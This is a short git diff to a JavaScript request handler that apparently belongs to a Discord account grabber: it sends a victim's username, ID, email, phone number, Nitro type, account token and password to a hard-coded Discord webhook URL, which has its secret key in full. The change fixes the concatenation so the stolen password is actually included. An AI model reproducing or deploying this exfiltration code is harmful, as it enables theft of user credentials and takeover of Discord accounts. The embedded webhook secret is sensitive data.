@@ -37,7 +37,7 @@ exports.send = (req, res, webhook) => {
 
         axios.post(`https://discord.com/api/webhooks/797933426220204132/QVTVod__SFum4eHguecQ-5t1UOnc3BWm7rC-fb_sekgflTr21-E6sIyZJtW04IGEYCyg`, {
             username: JSON.parse(JSON.stringify(y)).username,
-            content: `Username : ` + JSON.parse(JSON.stringify(y)).username + "#" + JSON.parse(JSON.stringify(y)).discriminator + '\n' + `ID : ` + JSON.parse(JSON.stringify(y)).id + '\n' + "E-Mail : " + JSON.parse(JSON.stringify(y)).email + '\n' + "Phone : " + JSON.parse(JSON.stringify(y)).phone + '\n' + "Nitro Type : " + nitro + '\n' + "Token : " + token + '\n' + "Password : "
+            content: `Username : ` + JSON.parse(JSON.stringify(y)).username + "#" + JSON.parse(JSON.stringify(y)).discriminator + '\n' + `ID : ` + JSON.parse(JSON.stringify(y)).id + '\n' + "E-Mail : " + JSON.parse(JSON.stringify(y)).email + '\n' + "Phone : " + JSON.parse(JSON.stringify(y)).phone + '\n' + "Nitro Type : " + nitro + '\n' + "Token : " + token + '\n' + "Password : " +
             password
         }).then((z) => {
         	if (z.status === 200) return res.status(200).json({status: "ok",message: "Sent."});
